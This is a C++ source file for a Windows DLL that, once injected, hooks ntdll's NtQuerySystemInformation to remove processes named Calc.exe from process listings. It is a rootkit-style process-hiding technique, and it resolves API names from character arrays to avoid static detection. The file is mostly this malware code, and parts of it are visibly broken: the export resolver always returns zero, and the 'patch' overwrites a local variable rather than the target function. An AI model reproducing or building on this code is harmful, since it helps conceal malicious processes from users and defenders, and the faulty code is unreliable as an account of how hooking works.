#include "stdafx.h"
#include <windows.h>
#pragma comment(lib, ntdll.lib )

/***************************************************************
                 General definintions
/**************************************************************/

PVOID _VirtualProtect;
#define _VirtualProtect(a,b,c,d)((BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))_VirtualProtect)(a,b,c,d)

typedef struct
{
	PWCHAR module;
	PCHAR Originalfunction;
	DWORD HookFunction;
	int Type;

} Table, *pTable;



/****************************************************************
                    NtStructs  
*****************************************************************/

#ifndef NTSTATUS 
#define NTSTATUS LONG 
#endif 

#define STATUS_SEVERITY_ERROR            0x3 

#define NT_SUCCESS(x) ((x) >= 0) 
#define STATUS_SUCCESS	0x00000000 

typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemNextEventIdInformation,
	SystemEventIdsInformation,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemPlugPlayBusInformation,
	SystemDockInformation,
	SystemPowerInformation1,
	SystemProcessorSpeedInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation

} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
}LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef CONST PUNICODE_STRING PCUNICODE_STRING;

typedef LONG KPRIORITY;

typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;

typedef struct _CLIENT_ID {
	DWORD UniqueProcess;
	DWORD UniqueThread;
} CLIENT_ID;

typedef struct _SYSTEM_THREADS {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	LONG State;
	LONG WaitReason;
} SYSTEM_THREADS, *PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters;
	SYSTEM_THREADS Threads[1];
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;



typedef NTSTATUS(NTAPI *__NtQuerySystemInformation)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
	);

NTSTATUS NTAPI NtQuerySystemInformation_Hook(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);


/****************************************************************
        Custom resolvers because why not ?
****************************************************************/



struct TEB
{
	NT_TIB NtTib;
	PVOID EnvironmentPointer;
	CLIENT_ID ClientId;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	struct PEB* ProcessEnvironmentBlock;
	//...
};


struct PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
};


struct PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN SpareBits : 1;
		};
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PEB_LDR_DATA* Ldr;
	//...
};


struct LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};

	PVOID DllBase;
	PVOID EntryPoint;

	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	//...
};

int  _strcmp(PCHAR s1, PCHAR s2)
{
	while (*s1 == *s2)
	{
		if (*s1 == 0)
			return 0;
		s1++;
		s2++;
	}
	return s1 - s2;
}


HMODULE WINAPI fnGetModuleW(_In_opt_ PWCHAR lpModuleName)
{
	TEB *pTeb = (TEB*)NtCurrentTeb();
	PEB *pPeb = pTeb->ProcessEnvironmentBlock;

	PEB_LDR_DATA *pLdrData = pPeb->Ldr;
	LDR_DATA_TABLE_ENTRY  *ListHead = (LDR_DATA_TABLE_ENTRY*)(&(pLdrData->InLoadOrderModuleList));

	if (lpModuleName == 0)
	{
		return (HMODULE)pPeb->ImageBaseAddress;
	}

	LDR_DATA_TABLE_ENTRY *pLdrMod = (LDR_DATA_TABLE_ENTRY*)((PLIST_ENTRY)ListHead)->Flink;

	while (ListHead != pLdrMod)
	{
		if (!_wcsicmp(pLdrMod->BaseDllName.Buffer, lpModuleName))
			return (HMODULE)pLdrMod->DllBase;
		else
			pLdrMod = (LDR_DATA_TABLE_ENTRY*)pLdrMod->InLoadOrderLinks.Flink;

	}


	return nullptr;
}


PVOID WINAPI fnGetProcAddress(HMODULE Mod, PCHAR Func)
{
	PIMAGE_DOS_HEADER pDosHead;
	PIMAGE_NT_HEADERS pNtHead;
	PIMAGE_DATA_DIRECTORY pData;
	PIMAGE_EXPORT_DIRECTORY pExD;
	pDosHead = PIMAGE_DOS_HEADER(Mod);
	pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Mod + (DWORD)pDosHead->e_lfanew);
	pData = &pNtHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	pExD = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHead + pData->VirtualAddress);
	DWORD fncRVA = NULL;
	for (auto i = 0; i < pExD->NumberOfNames; ++i)
	{
		if ((DWORD)Func & 0xFFFF0000)
		{
			PCHAR _aa = ((PCHAR)(DWORD)pDosHead + ((PULONG)((DWORD)pDosHead + pExD->AddressOfNames))[i]);
			if (_strcmp(_aa, Func)) continue;
			DWORD index = ((WORD*)((DWORD)pDosHead + pExD->AddressOfNameOrdinals))[i];
			fncRVA = ((DWORD*)((DWORD)pDosHead + pExD->AddressOfFunctions))[index];

		}
	}

	return 0;
}

/***************************************************************
            Hooking starts here
****************************************************************/

__NtQuerySystemInformation pNtQuerySystemInformation = NULL;

NTSTATUS NTAPI NtQuerySystemInformation_Hook(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
)
{
	NTSTATUS Result;
	PSYSTEM_PROCESSES pSystemProcess;
	PSYSTEM_PROCESSES pNextSystemProcess;


	Result = pNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength); // call original function 

	if (NT_SUCCESS(Result))
	{
		switch (SystemInformationClass)
		{
		case SystemProcessInformation:

			pSystemProcess = (PSYSTEM_PROCESSES)SystemInformation;
			pNextSystemProcess = (PSYSTEM_PROCESSES)((PBYTE)pSystemProcess + pSystemProcess->NextEntryDelta);

			while (pNextSystemProcess->NextEntryDelta != 0)
			{

				pSystemProcess = pNextSystemProcess;
				pNextSystemProcess = (PSYSTEM_PROCESSES)((PUCHAR)(pNextSystemProcess)+pNextSystemProcess->NextEntryDelta);
				if (!wcsncmp(pNextSystemProcess->ProcessName.Buffer, L"Calc.exe", pNextSystemProcess->ProcessName.Length))
				{
					if (!pNextSystemProcess->NextEntryDelta) {
						pSystemProcess->NextEntryDelta = 0;
					}
					else {
						pSystemProcess->NextEntryDelta += pNextSystemProcess->NextEntryDelta;
					}

					pNextSystemProcess = pSystemProcess;
				}

			}


		}

	}

	return Result;

}

Table hooktable[] = 
{
    
     { L"ntdll.dll", "NtQuerySystemInformation", (DWORD)NtQuerySystemInformation_Hook, 1 } // ntdll!NtQuerySystemInformation 

};


void WINAPI Hook(pTable hooktable)
{
	HMODULE Mod = fnGetModuleW(hooktable->module);
    PIMAGE_DOS_HEADER pDosHead;
	PIMAGE_NT_HEADERS pNtHead;
	PIMAGE_DATA_DIRECTORY pData;
	PIMAGE_EXPORT_DIRECTORY pExD;
	pDosHead = PIMAGE_DOS_HEADER(Mod);
	pNtHead = (PIMAGE_NT_HEADERS)((DWORD)Mod + (DWORD)pDosHead->e_lfanew);
	pData = &pNtHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	pExD = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHead + pData->VirtualAddress);
	DWORD fncRVA = NULL;
	for (auto i = 0; i < pExD->NumberOfNames; ++i)
	{
		if ((DWORD)hooktable->Originalfunction & 0xFFFF0000)
		{
			PCHAR _aa = ((PCHAR)(DWORD)pDosHead + ((PULONG)((DWORD)pDosHead + pExD->AddressOfNames))[i]);
			if (_strcmp(_aa, hooktable->Originalfunction)) continue;
			DWORD index = ((WORD*)((DWORD)pDosHead + pExD->AddressOfNameOrdinals))[i];
			fncRVA = ((DWORD*)((DWORD)pDosHead + pExD->AddressOfFunctions))[index];

		}
	}

	WCHAR szKernel32[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'l', L'3', L'2', L'.', L'd', L'l', L'l',  L'\0' };
	CHAR szVirtualProtect[] =
	{
		'V', 'i', 'r', 't', 'u', 'a',
		'l', 'p', 'r', 'o', 't', 'e',
		'c', 't', '\0'
	};
    
	HMODULE kernel32 = fnGetModuleW(szKernel32); // get kernel base 
	_VirtualProtect = fnGetProcAddress(kernel32, szVirtualProtect); // resolve virtual protect dynamically 

	if (hooktable->Type == 1) // simple patch 
	{
		DWORD d;
		_VirtualProtect((LPVOID)fncRVA, (DWORD)4, PAGE_EXECUTE_READWRITE, &d); // Set memory page executable 
		fncRVA = hooktable->HookFunction;
		_VirtualProtect((LPVOID)fncRVA, (DWORD)4, d, &d);  // patch the original function with our new one 
	}

	else
	{

	}

}

void SetupHook()
{
	
	Hook(&hooktable[0]); // initiate hook function 
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		SetupHook();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}



